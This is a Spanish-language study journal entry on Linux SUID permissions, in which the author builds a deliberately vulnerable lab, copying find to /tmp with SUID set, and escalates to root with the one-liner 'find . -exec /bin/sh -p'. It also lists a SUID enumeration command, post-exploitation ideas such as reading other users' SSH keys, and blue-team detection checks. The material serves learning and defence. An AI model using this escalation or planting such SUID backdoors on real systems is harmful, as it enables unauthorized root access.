# Semana 03 — SUID, `/etc/shadow` y escalada de privilegios

Acá hizo click todo lo de permisos. Un bit especial —el SUID— explica cómo un usuario común termina siendo root con una sola línea. Monté un laboratorio vulnerable a propósito para verlo pasar de los dos lados.


## 01. Qué es el bit SUID

Normalmente un programa corre con los permisos del usuario que lo lanza. Con **SUID activo, corre con los permisos del dueño del archivo**, no del que lo ejecuta. La analogía que me lo fijó: es un traje colgado en la puerta; cualquiera que se lo pone actúa con los permisos del dueño del traje. Si el traje es de root, esa persona hace lo que quiera.

Se ve en `ls -la` como una `s` en lugar de la `x` del dueño:

```bash
# SUID activo (la 's') — se ejecuta como el dueño
-rwsr-xr-x  root root  /usr/bin/passwd

# sin SUID (la 'x' normal) — se ejecuta como vos
-rwxr-xr-x  root root  /usr/bin/ls
```


## 02. Por qué passwd necesita SUID (y por qué es seguro)

`passwd` tiene SUID porque necesita escribir en `/etc/shadow`, que solo root toca. Pero es seguro porque fue programado con restricciones: verifica tu identidad antes de actuar, modifica solo tu línea y no te deja escapar a una shell. La diferencia con los binarios peligrosos es esa: qué te dejan hacer una vez adentro.

| Binario | ¿SUID necesario? | Por qué |

|---|---|---|

| `passwd` | Sí | Debe escribir en `/etc/shadow` |

| `sudo` / `su` | Sí | Su función completa requiere root |

| `find` | No | Solo busca archivos — con SUID da shell root |

| `python3` | No | Intérprete genérico — una línea y sos root |

| `bash` / `vim` | No | Shell o editor directo — root inmediato |

| cualquier cosa en `/tmp` | Nunca | `/tmp` es escribible por todos — es una backdoor |


## 03. El laboratorio: crear la vulnerabilidad

Para entender el ataque primero lo construí. Copié `find` a `/tmp`, le activé el SUID con dueño root, y me cambié a un usuario víctima sin privilegios.

```bash
# preparar el binario vulnerable
sudo cp /usr/bin/find /tmp/find_vulnerable
sudo chmod u+s /tmp/find_vulnerable   # = chmod 4755

# entrar como usuario sin privilegios (simula el CTF)
su - victima
```


## 04. El exploit — una sola línea

Reconocimiento primero: `whoami`, `id`, y el comando clave para buscar binarios SUID en todo el sistema. Después, GTFOBins te da el exploit exacto para cada uno.

```bash
# buscar todos los binarios SUID
find / -perm -u=s -type f 2>/dev/null

# el exploit: find lanza /bin/sh heredando euid=0
/tmp/find_vulnerable . -exec /bin/sh -p \;

# verificar
whoami   # -> root
```

**Por qué funciona:** `find` con `-exec` lanza `/bin/sh` como proceso hijo, y ese hijo hereda el euid=0 del padre. La shell nace siendo root. El flag `-p` es clave en sistemas modernos: bash degrada privilegios al abrir una shell interactiva, y `-p` fuerza a preservar la identidad efectiva. Ahí entendí la diferencia entre **uid** (quién sos) y **euid** (con qué permisos actuás ahora mismo).

> **↳ Los dos lados** Cada fase de ataque tiene su espejo defensivo. Un binario SUID en `/tmp` es alarma roja inmediata en una auditoría — porque sé exactamente lo que hace un atacante con él.


## 05. Post-explotación y limpieza — la visión del Blue Team

Con root, la privacidad de todos los demás usuarios desaparece: leés sus `.bash_history` (a veces con contraseñas escritas por error), sus llaves SSH, cambiás sus claves. La parte que más me sirvió fue el cleanup al revés: si sé qué borra un atacante, sé qué buscar para detectarlo.

| Vector de detección | Qué busca el Blue Team |

|---|---|

| `/var/log/auth.log` | Cada `sudo`, `su` y cambio de usuario queda registrado |

| `find / -nouser` | Archivos huérfanos de un usuario borrado apurado |

| Binarios en `/tmp` | Cualquier ejecutable ahí es sospechoso |

| Timestamps anómalos | Un archivo recién modificado en `/etc` es señal |


## 06. Lo que no entendía al principio

| Confusión | Cómo lo resolví |

|---|---|

| Por qué `find` es peligroso y `passwd` no, si los dos tienen SUID | `find -exec` te deja ejecutar cualquier cosa; `passwd` tiene restricciones internas |

| Qué diferencia hay entre uid y euid | uid es tu identidad real; euid es con qué permisos actuás — para el sistema manda el euid |

| Para qué sirve el `-p` en `/bin/sh -p` | Evita que bash degrade el euid=0 a tu usuario real al abrir la shell |

| Por qué se llama `passwd` si no guarda contraseñas | Herencia de Unix: antes las guardaba, después las movieron a `/etc/shadow` |


## 07. Conexión con el mundo profesional

Este es el corazón de la escalada de privilegios local, y aparece en casi todos los CTF de nivel entrada e intermedio. GTFOBins es la biblia. Del lado defensivo, revisar el baseline de binarios SUID (`find / -perm -u=s -type f > baseline.txt`) y compararlo en el tiempo es un control real de hardening.


## 08. Pregunta pendiente y próximo paso

Con `find`, `python3`, `bash`, `vim` y `perl` dominados, el próximo vector es `sudo -l`. Pero antes tocaba consolidar todo con las manos en la masa: arrancar **OverTheWire Bandit** desde el nivel 0.

— fv
